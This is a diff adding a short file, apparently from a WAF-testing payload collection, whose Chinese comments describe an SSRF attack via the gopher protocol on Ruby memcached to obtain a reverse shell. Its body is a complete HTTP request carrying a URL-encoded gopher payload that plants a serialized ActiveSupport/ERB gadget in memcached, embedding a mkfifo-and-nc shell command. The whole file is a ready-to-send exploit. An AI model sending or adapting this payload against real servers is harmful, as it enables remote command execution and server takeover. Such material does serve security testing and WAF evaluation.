@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_Gopher协议_RubyMemcache反弹shell
+# MemCache是一个自由、源码开放、高性能、分布式的分布式内存对象缓存系统,用于动态Web应用以减轻数据库的负载。利用gopher协议攻击Ruby memcached，执行命令反弹shell。
+GET /?id=gopher:%2F%2F127.0.0.1:11211%2F_%250d%250aset%2520SpyD3r%25204%252060%2520282%250d%250a%2504%2508o:%2540ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy%2509:%250E%2540instanceo:%2508ERB%2506:%2509%2540srcI%2522b%25x%2528rm%2520-f%2520%2Ftmp%2Ff%253B%2520mkfifo%2520%2Ftmp%2Ff%253Bcat%2520%2Ftmp%2Ff%2520%257C%2520%2Fbin%2Fsh%2520-i%25202%253E%25261%2520%257C%2520nc%2520-l%2520127.0.0.1%25201234%2520%253E%2520%2Ftmp%2Ff%2529%253B%2506:%2506ET:%250C%2540method:%250Bresult:%2509%2540varI%2522%250C%2540result%2506%253B%2509T:%2510%2540deprecatoro:%251FActiveSupport::Deprecation%2506:%250E%2540silencedT%250d%250a&bid=hd_tag_m8mv2673 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2673
+RM-PRO-Token: c0d2eed0a69221e847cc77a15daca681
+RM-PRO-Time: 1742808551033
+User-Agent: curl/7.83.1
+
